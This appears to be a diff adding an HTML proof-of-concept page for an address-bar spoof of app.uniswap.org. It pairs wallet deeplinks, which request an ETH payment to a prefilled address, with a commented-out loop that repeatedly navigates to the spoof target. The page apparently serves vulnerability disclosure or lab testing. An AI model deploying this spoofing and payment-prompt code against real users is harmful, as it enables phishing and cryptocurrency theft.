@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>app.uniswap.org → Ethereum Deeplink PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; background:#f7fafc; color:#0f172a; padding:28px; text-align:center; }
+    .card { display:inline-block; background:#fff; padding:20px 22px; border-radius:12px; box-shadow:0 6px 24px rgba(2,6,23,0.06); width:360px; }
+    button { background:#2172e5; color:#fff; border:none; border-radius:8px; padding:10px 14px; font-size:15px; cursor:pointer; margin:8px 6px; }
+    .muted { color:#6b7280; font-size:13px; }
+    pre { text-align:left; background:#0f172a; color:#e6eef8; padding:10px; border-radius:8px; font-family:ui-monospace,monospace; font-size:13px; overflow:auto; max-height:160px; }
+    input, select { padding:8px 10px; border-radius:8px; border:1px solid #e6e9ef; width:100%; box-sizing:border-box; margin-top:8px; }
+    .row { text-align:left; margin-top:12px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>app.uniswap.org → Ethereum Deeplink PoC</h2>
+    <p class="muted">Use for lab testing only. Deeplinks open your mobile wallet app (user consent required).</p>
+
+    <div class="row">
+      <label class="muted">Recipient address (dummy):</label>
+      <input id="addr" value="0x7b0e1dcfe4d9b40517cf729104f8dcfaf914ec9d" />
+    </div>
+
+    <div class="row">
+      <label class="muted">Value (wei hex) — example ~0.001 ETH = 0x3782dace9d90000</label>
+      <input id="value" value="0x3782dace9d90000" />
+    </div>
+
+    <div style="margin-top:12px;">
+      <button id="connect">Connect (window.ethereum)</button>
+      <button id="eip681">Open EIP-681 deeplink</button>
+      <button id="mmapp">Open MetaMask App Link</button>
+    </div>
+
+    <p id="status" class="muted" style="margin-top:10px">Not connected</p>
+
+    <pre id="log">Ready.\n</pre>
+
+    <p class="muted" style="margin-top:10px">Omnibox spoof target: <code>https://app.uniswap.org:88</code></p>
+  </div>
+
+<script>
+(function(){
+  const logEl = document.getElementById('log');
+  function log(s){ logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; }
+
+  // Safe: only triggered on user click
+  document.getElementById('connect').onclick = async () => {
+    try {
+      if (window.ethereum) {
+        log("[*] window.ethereum detected, requesting accounts...");
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        document.getElementById('status').innerText = "Connected: " + accounts[0];
+        log("[+] Connected: " + accounts[0]);
+      } else {
+        log("[!] window.ethereum not found (no injected provider).");
+        alert("No injected Ethereum provider found (MetaMask / other).");
+      }
+    } catch (e) {
+      log("[!] Connect error: " + (e && e.message ? e.message : e));
+    }
+  };
+
+  // Build EIP-681 link and navigate to it (user will be prompted in wallet)
+  // EIP-681 examples:
+  //  - Send: ethereum:0xADDRESS@chain_id?value=0x...  (some wallets accept)
+  //  - Generic: ethereum:pay-0xADDRESS?value=0x...
+  function buildEIP681(addr, valueHex, chainId=1) {
+    // We'll use the "pay" form which is widely supported: ethereum:pay-<address>@<chainId>?value=<hex>
+    // Example: ethereum:pay-0x..@1?value=0x...
+    // Note: implementer support varies; wallets may also accept "ethereum:0x..@1?value=0x..."
+    addr = addr.trim();
+    if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) return null;
+    valueHex = (valueHex || "").trim();
+    if (!/^0x[0-9a-fA-F]+$/.test(valueHex)) {
+      // fallback to 0 value
+      valueHex = "0x0";
+    }
+    return `ethereum:pay-${addr}@${chainId}?value=${valueHex}`;
+  }
+
+  document.getElementById('eip681').onclick = () => {
+    const addr = document.getElementById('addr').value;
+    const value = document.getElementById('value').value;
+    const uri = buildEIP681(addr, value, 1);
+    if (!uri) {
+      alert("Please enter a valid recipient address (0x...).");
+      return;
+    }
+    log("[*] Opening EIP-681 URI: " + uri);
+    // Navigate — opens wallet if supported
+    location.href = uri;
+  };
+
+  // MetaMask mobile deep link (universal link)
+  // https://metamask.app.link/send/<address>?value=<decimalWei>
+  // Many wallets accept decimals as hex/decimal; we convert hex->decimal for the app.link form.
+  function hexToDecimal(hex) {
+    try {
+      if (hex.startsWith("0x")) hex = hex.slice(2);
+      return BigInt("0x" + hex).toString(10);
+    } catch (e) { return null; }
+  }
+
+  document.getElementById('mmapp').onclick = () => {
+    const addr = document.getElementById('addr').value.trim();
+    const valueHex = document.getElementById('value').value.trim();
+    if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) { alert("Enter valid 0x address"); return; }
+    const valueDec = hexToDecimal(valueHex) || "0";
+    const mmLink = `https://metamask.app.link/send/${addr}?value=${valueDec}`;
+    log("[*] Opening MetaMask app link: " + mmLink);
+    // Try to open metaMask app via universal link / fallback to browser
+    location.href = mmLink;
+  };
+
+  // Optional: try periodic omnibox spoof target navigation (same pattern)
+  // Kept disabled by default — uncomment to enable automatic attempts
+  /*
+  setTimeout(()=> {
+    try { window.stop(); } catch(e) {}
+    location.href = "https://app.uniswap.org:88";
+  }, 300);
+  setInterval(()=>{
+    try { location.href = "https://app.uniswap.org:88"; } catch(e){}
+  }, 9500);
+  */
+
+  // Small helper to copy constructed URI for manual use
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'u' && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      const addr = document.getElementById('addr').value;
+      const value = document.getElementById('value').value;
+      const uri = buildEIP681(addr, value, 1);
+      if (uri) {
+        navigator.clipboard && navigator.clipboard.writeText(uri).then(()=>log("[✓] EIP-681 URI copied to clipboard"));
+      } else log("[!] Invalid address for URI copy");
+    }
+  });
+
+  log("[i] Ethereum Deeplink PoC ready. Use buttons to interact.");
+})();
+</script>
+</body>
+</html>
